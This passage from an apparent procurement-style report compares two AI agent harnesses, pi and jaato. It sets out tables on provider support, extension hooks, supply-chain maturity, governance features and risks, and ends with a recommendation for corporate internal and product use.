| Hyperscaler gateways | **Bedrock** (IAM, task roles, IRSA, endpoint override), **Vertex**, **Azure OpenAI**, Cloudflare AI Gateway, Vercel AI Gateway | Vertex (`google_genai`); no native Bedrock or Azure (reachable via OpenRouter or an OpenAI-compatible endpoint, unverified) |
| Subscription OAuth | Claude Pro/Max, ChatGPT Codex, Copilot, xAI, OpenRouter | Anthropic PKCE, Antigravity (Google), GitHub device flow, Claude CLI wrapper |
| Local / self-hosted | llama.cpp first-class; Ollama, vLLM, LM Studio via `models.json` | `ollama`, `lmstudio`, `vllm`, `tensorrt_llm`, `triton`, `nim`, `chrome_ai` |
| EU providers | via OpenAI-compatible config | `ovhcloud`, `nebius` |
| Custom provider | `models.json` or `pi.registerProvider()` (777-line guide) | provider plugin + capability contract enforced by CI conformance tests |
| Model metadata | cost, context, reasoning, image input, cached from pi.dev | context and modality from catalogs; cost from operator `pricing.json` |
| Non-native tool calling | not found | `prose_tool_calls` quirk; vLLM small-model quirks |
| Model tiers / fallback | no cross-model fallback chain found | `model_tiers` with `enter_tier`, cross-provider; OpenRouter `models` fallback list |
| Multimodal | image input; no audio/PDF | image input on most providers; PDF and audio in/out on OpenRouter and OpenAI-shaped wires; audio output streaming |
| Corporate proxy | `httpProxy` setting | `HTTPS_PROXY`, `JAATO_NO_PROXY`, **Kerberos/SPNEGO** proxy auth |

### Extension surfaces

**pi** exposes 33 lifecycle events (`src/core/extensions/types.ts`), the most
useful for governance being `tool_call` (block/mutate), `tool_result`
(rewrite), `input` (intercept or handle without the model),
`before_agent_start` (replace the system prompt structurally),
`before_provider_request` / `before_provider_headers` (gateway routing, request
logging) and `project_trust`. Extensions are TypeScript loaded through jiti from
`~/.pi/agent/extensions`, `.pi/extensions`, packages or `-e`; they "run with your
full system permissions". Package distribution is npm or git with pinned refs,
no registry, no signing. Skills follow the agentskills.io standard and can
reuse `~/.claude/skills`.

**jaato** exposes five entry-point groups (`jaato.plugins`, `gc_plugins`,
`cache_plugins`, `extensions`, `premium`) gated by an entry-point trust policy
(built-in names reserved, refusal before import, never-shadowable security
set), five daemon hooks (extension factory, WS connection interceptor, session
hook, environment aspects, remote subagent handler), an enrichment pipeline
(prompt, system instructions, tool results with priorities), result rewriters,
completion processors, tool and plugin traits, host-provided client tools
(execute in the IDE or browser), and profile YAML with inheritance, payload
schemas and typed knobs. `jaato-scaffold` generates clients, cascades,
observers, sweeps and host tools from the *live* registry and `jaato-doctor`
does preflight and post-mortems.

### MCP

pi: "No MCP" by design; you write the bridge. jaato: full MCP client
(`.mcp.json`, per-server prefixing, secret-name scrubbing of MCP subprocess
env, results marked untrusted). Neither exposes itself as an MCP server.

### Clients and languages

pi is TypeScript only; other languages talk JSONL over stdin/stdout. jaato has
Python in-process, Python IPC/WS SDK, a TypeScript SDK (pre-release, not on npm,
40 tests), a React web client, a TUI, and premium web components
(`<jaato-task>`, `<jaato-profile>`). Neither ships a Slack or Teams client;
jaato's `ClientType.CHAT` presentation contract and expandable-content
negotiation make one a days-scale task.

## 13. Multi-agent

pi: no built-in subagents; the reference extension spawns a `pi` process per
subagent with markdown agent definitions, parallel and chain modes, and usage
capture through JSON mode. jaato: subagents share the parent runtime and get
their own session; profiles with inheritance and most-restrictive-wins limits;
`spawn_payload_schema` validated before creation and
`completion_payload_schema` at the end; cascades with budgets and cross-session
event fan-out; pre-warm runner pool (30 s → 7 s bootstrap). Premium adds
handoff atoms and a HandoffGate; its remote cross-server spawn is flagged
"broken on both legs" in its own backlog.

## 14. Supply chain, release integrity, maturity

| | pi | jaato free | jaato premium |
|---|---|---|---|
| Dependency policy | exact pins enforced, `min-release-age=2`, shrinkwrap shipped, lifecycle-script allowlist, `npm audit signatures` scheduled | Python extras; entry-point allowlist + shadow policy | private git dependency |
| Release artefacts | npm packages, Bun binaries, `SHA256SUMS` (checksums, no Sigstore/GPG), reproducible-from-source path | three TestPyPI publish workflows (`sdk`, `server`, `tui`) with a version-exists guard; PyPI is the stated destination once the alpha label comes off; no signed releases yet; `install.py` installer | direct delivery under the commercial licence (maintainer-stated intent; no public channel by design) |
| Tests | 535 test files (269 in coding-agent) | 767 test files, about 13,000 test functions | 63 files, about 1,000 tests, uneven (PII 168, secrets 1) |
| Guards | biome, pinned-dep, entry-graph and shrinkwrap checks | required `contract-guards` CI job: protocol conformance, provider capability conformance, cyclomatic ratchet (≤15, 416 baselined), env-scope catalog ratchet | — |
| Docs | 32 files / 12.6k lines in coding-agent, candid about limits | about 140 docs, about 70k lines, design docs record incidents | 18 docs, one operator doc stale |
| Cadence | 275 releases since 2025-11-25, changelog per release | no changelog; alpha classifier; two very large files (`session_manager.py` 557 KB, `core.py` 340 KB) | alpha; 77 commits |
| Governance | single maintainer copyright; new-contributor issues auto-closed | single licensor | single licensor |

Both are young. pi's strength is disciplined packaging and a stable, documented
extension contract. jaato's is breadth of shipped policy and unusually strong
contract tests, offset by alpha labelling, no changelog and single-vendor
concentration across free and premium. On distribution, read jaato's current
state as a stage rather than a stance: the three TestPyPI workflows are the
rehearsal for PyPI, which the maintainer states is the intended channel for
the free packages once they leave alpha, while premium will keep being handed
over directly because its licence is a per-customer agreement. A procurement
checklist should therefore ask for PyPI publication and release signing as
conditions of adoption, not treat their absence as a design choice.

## 15. Harness-by-harness

| Harness | pi | jaato free | jaato premium adds |
|---|---|---|---|
| **Compliance reviewer** (must refuse unsafe actions, prove what it checked) | `tool_call` block + `input` intercept; you write policy, persistence, attestation | permission policy + evaluators + completion gate that can refuse a completion; untrusted boundary | Daruma: compiled default-deny + attestation of the receipt against the ledger |
| **Code-review bot** (read-only, CI-triggered) | strong: SDK, `tools: [read, grep, find, ls]`, `edit` patches; container it | `lsp`, `ast_search`, `filesystem_query`, `webhook` GitHub route, AppArmor read-only profile | — |
| **Chat assistant** (Slack/Teams, many users) | one process or RPC subprocess per user; no shared server, no identity | daemon + recovery client + `ClientType.CHAT`; per-session confinement or one daemon per tenant; bearer token only | OIDC SSO, WS auth proxy, mTLS, cluster, pseudonymisation of user PII |
| **Batch job runner** | `--mode json`, `PI_OFFLINE`, in-memory sessions; no limits, add your own | runner pool, `budget_control`, `jaato-eval` sweeps, `echo` provider for CI | fork-budget carry-over |
| **IDE assistant** | TS-native, ideal fit | host-provided tools, `stageFiles`, TS SDK (vendor it until npm) | web components |
| **Customer-facing product** | MIT | licence forbids without agreement | commercial |

## 16. What you will have to build anyway

| Capability | pi | jaato free | jaato premium |
|---|---|---|---|
| Approval policy engine with persisted decisions | build (weeks) | ships | ships |
| Actor identity on approvals and events | build | build (days; hook exists) | partial (`X-Jaato-User` at edge) |
| Agent-role scoping (tools, limits, policy per role) | build | ships (profiles) | ships + Daruma |
| Hooking your approval / RBAC service into permission decisions | build (`tool_call` extension) | configure (evaluator or webhook/file channel) | configure; park and resume demoed |
| Identity model (IdP group to role, approver on the record) | build | build (hook exists) | partial (OIDC login, edge allowlist) |
| Tenant isolation | container per tenant, your topology | ships (per-session confinement on one daemon, or daemon per tenant with its own token) | ships + cluster fronting; tenant id still a reserved field |
| Kernel or container confinement | deploy a container/VM | ships on Linux | ships |
| Turn / token / cost / time limits | build | ships | ships |
| Secret scrubbing from tool env | build via `spawnHook` | configure (opt-in) | configure |
| Secret manager integration | `!command` | write a resolver or buy premium | ships |
| PII pseudonymisation | build | build on seam (weeks) | ships |
| Retention and purge | build | apply your storage policy to the documented file layout (by design) | same |
| Data-subject erasure across sessions, logs and telemetry | build | build (search-and-delete over known paths) | build |
| OpenTelemetry export | write adapter; verify SDK threading | ships | ships |
| Tamper-evident audit log | build | build | partial (sealed redaction audit) |
| Prompt-injection defence | build | soft boundary ships; classifier build | same |
| MCP client | build | ships | ships |
| Multi-user server with auth | build | daemon + token ships; SSO build | ships (OIDC) |
| Regulatory documentation | build | build | build |

## 17. Risks to weigh

**pi**

- Policy vacuum is total: an unattended pi run with a leaked `AGENTS.md`
  injection and full env passthrough has no in-process brake. Your container
  boundary *is* the security model.
- Extensions are unsandboxed TypeScript running as the user; package
  installation is npm/git with no allowlist enforcement.
- Default install/version pings and the `/share` upload path need policy
  attention before rollout.
- No shared server means per-user cost, audit and identity are aggregated by
  you.

**jaato free**

- BUSL licence; single licensor for both tiers.
- Alpha status, no changelog, very large core modules; pin a version and own
  the fork discipline. Packages reach TestPyPI today; PyPI publication is
  stated intent for the exit from alpha, so pin by commit until then.
- IPC socket is unauthenticated by design; multi-user must go through
  WebSocket.
- Secret scrubbing and telemetry redaction are opt-in; a profile that forgets
  them leaks. One documented inert profile key for redaction.
- Linux-only confinement; Windows/macOS deployments fall back to path policy
  only.

**jaato premium**

- Proprietary; delivered directly under a per-customer agreement rather than
  through a package index, which is deliberate given the licence. No
  published pricing or SLA.
- Open backlog items in the exact areas a buyer cares about: remote spawn
  broken, stale pseudonymisation operator doc, session journal in-memory only,
  drift subsystem under refactor.
- `verify=False` on OIDC discovery fetches.
- Premium features can be blocked on free-tier releases (documented dependency
  pattern).

## 18. Recommendation

For a corporation building **internal** harnesses on Linux infrastructure that
must show auditors permission gating, resource confinement, budgets, tracing
and a PII story, **jaato free is the lower-effort base, and premium closes the
SSO, secrets and pseudonymisation gaps if the commercial terms work**. Plan the
remaining build (approver identity on events, group-to-profile binding,
retention, signed audit, regulatory documentation) at roughly 6–12 engineer-weeks on top.

For a corporation that will **ship a product**, is a TypeScript shop, or
already runs every agent in a hardened container with a gateway that holds
the credentials, **pi is the cleaner substrate**: MIT, disciplined packaging,
enterprise gateways built in, and a stable extension API. Budget the
governance layer honestly: permission engine, limits, redaction, OTel adapter,
MCP bridge and a multi-user service are all yours, realistically 3–6
engineer-months before parity with what jaato free ships today.

Either way, the three things nobody ships — approver identity in the audit
record, data-subject erasure tooling, and the AI Act documentation set —
should be on the plan from day one; retention itself is a storage-policy
task on jaato's plain-file layout.
